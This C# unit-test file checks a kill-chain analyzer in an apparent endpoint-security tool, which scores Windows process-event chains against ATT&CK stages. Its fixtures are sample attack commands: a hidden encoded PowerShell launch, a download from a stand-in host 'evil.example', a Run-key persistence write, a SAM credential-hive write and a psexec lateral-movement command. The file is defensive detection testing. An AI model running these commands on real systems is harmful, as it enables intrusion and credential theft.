using System;
using System.Collections.Generic;
using Bulwark.Core.Engine;
using Bulwark.Core.Models;
using Xunit;

namespace Bulwark.Core.Tests;

/// <summary>
/// <see cref="KillChainAnalyzer"/>:把进程链上下文映射到 ATT&CK 阶段,
/// 多阶段覆盖才加分(识别完整攻击链),单一阶段不加分(降误报)。
/// </summary>
public class KillChainAnalyzerTests
{
    private static ChainEventInfo Ev(EventType type, string actor, string target = "", string? cmd = null)
        => new()
        {
            TimestampUtc = DateTime.UtcNow,
            Type = type,
            ActorPid = 1000,
            ActorPath = actor,
            Target = target,
            CommandLine = cmd
        };

    [Fact]
    public void EmptyOrNull_ReturnsZero()
    {
        var (score, _, stages) = KillChainAnalyzer.Analyze(null);
        Assert.Equal(0, score);
        Assert.Equal(KillChainAnalyzer.Stage.None, stages);
    }

    [Fact]
    public void SingleStage_DoesNotScore()
    {
        // 只有"执行"一个阶段,不足以判定攻击链
        var ctx = new List<ChainEventInfo>
        {
            Ev(EventType.ProcessCreate, @"C:\Windows\System32\powershell.exe")
        };
        var (score, _, _) = KillChainAnalyzer.Analyze(ctx);
        Assert.Equal(0, score);
    }

    [Fact]
    public void MultiStageChain_IsFlaggedAsAttack()
    {
        // 执行(powershell) → 命令控制(下载) → 防御规避(bypass) → 持久化(Run 键)
        var ctx = new List<ChainEventInfo>
        {
            Ev(EventType.ProcessCreate, @"C:\Windows\System32\powershell.exe",
                cmd: "powershell -nop -w hidden -enc ZQ"),
            Ev(EventType.NetworkConnect, @"C:\Windows\System32\powershell.exe",
                cmd: "iwr http://evil.example/a.ps1"),
            Ev(EventType.RegistryWrite, @"C:\Windows\System32\powershell.exe",
                target: @"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil")
        };
        var (score, reasons, stages) = KillChainAnalyzer.Analyze(ctx);
        Assert.True(score > 0, "多阶段攻击链应加分");
        Assert.True((stages & KillChainAnalyzer.Stage.Persistence) == KillChainAnalyzer.Stage.Persistence);
        Assert.NotEmpty(reasons);
    }

    [Fact]
    public void CredentialAccessPlusLateralMovement_HighScore()
    {
        var ctx = new List<ChainEventInfo>
        {
            Ev(EventType.ProcessCreate, @"C:\Temp\x.exe", cmd: "cmd /c whoami"),
            Ev(EventType.FileWrite, @"C:\Temp\x.exe", target: @"C:\Windows\System32\config\SAM"),
            Ev(EventType.ProcessCreate, @"C:\Temp\x.exe", cmd: "psexec \\\\host -s cmd")
        };
        var (score, _, stages) = KillChainAnalyzer.Analyze(ctx);
        Assert.True(score >= 20);
        Assert.True((stages & KillChainAnalyzer.Stage.CredentialAccess) != 0);
        Assert.True((stages & KillChainAnalyzer.Stage.LateralMovement) != 0);
    }
}
